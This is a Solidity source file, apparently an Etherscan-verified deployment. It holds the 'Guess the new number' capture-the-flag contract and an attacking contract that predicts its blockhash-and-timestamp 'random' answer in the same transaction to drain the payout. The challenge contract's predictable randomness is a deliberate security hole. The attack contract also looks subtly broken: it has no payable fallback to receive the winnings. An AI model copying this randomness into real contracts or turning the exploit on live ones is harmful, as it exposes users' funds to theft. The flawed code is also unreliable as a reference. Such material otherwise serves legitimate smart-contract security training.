/**
 *Submitted for verification at Etherscan.io on 2021-07-29
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessForMe {
    function guess() public payable {
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(address(0xa4F185D9FFdbc0F3142a856bf859C97d85d5e6b7));
        
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(1 ether)(answer);
        msg.sender.transfer(2 ether);
    }
}